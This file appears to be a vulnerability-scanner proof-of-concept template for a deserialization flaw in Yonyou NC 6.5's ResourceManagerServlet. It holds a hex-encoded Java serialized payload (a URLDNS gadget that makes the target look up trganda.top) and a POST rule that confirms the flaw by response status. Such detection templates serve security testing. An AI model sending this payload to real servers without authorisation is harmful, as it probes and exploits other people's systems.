name: nc65-ResourceManagerServlet-rce
transport: http
set:
  r1: b"\xAC\xED\x00\x05\x73\x72\x00\x11\x6A\x61\x76\x61\x2E\x75\x74\x69\x6C\x2E\x48\x61\x73\x68\x4D\x61\x70\x05\x07\xDA\xC1\xC3\x16\x60\xD1\x03\x00\x02\x46\x00\x0A\x6C\x6F\x61\x64\x46\x61\x63\x74\x6F\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6F\x6C\x64\x78\x70\x3F\x40\x00\x00\x00\x00\x00\x0C\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0C\x6A\x61\x76\x61\x2E\x6E\x65\x74\x2E\x55\x52\x4C\x96\x25\x37\x36\x1A\xFC\xE4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6F\x64\x65\x49\x00\x04\x70\x6F\x72\x74\x4C\x00\x09\x61\x75\x74\x68\x6F\x72\x69\x74\x79\x74\x00\x12\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B\x4C\x00\x04\x66\x69\x6C\x65\x71\x00\x7E\x00\x03\x4C\x00\x04\x68\x6F\x73\x74\x71\x00\x7E\x00\x03\x4C\x00\x08\x70\x72\x6F\x74\x6F\x63\x6F\x6C\x71\x00\x7E\x00\x03\x4C\x00\x03\x72\x65\x66\x71\x00\x7E\x00\x03\x78\x70\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x74\x00\x0B\x74\x72\x67\x61\x6E\x64\x61\x2E\x74\x6F\x70\x74\x00\x00\x71\x00\x7E\x00\x05\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x12\x68\x74\x74\x70\x3A\x2F\x2F\x74\x72\x67\x61\x6E\x64\x61\x2E\x74\x6F\x70\x78"
rules:
  r0:
    request:
      method: POST
      path: /servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet
      body: |
        {{r1}}
      headers:
        Content-Type: application/octet-stream
    expression: response.status == 200
expression: r0()
detail:
  author: trganda
  links:
    - https://github.com/ax1sX/SecurityList/blob/main/Yongyou/yongyou_NC_Audit.md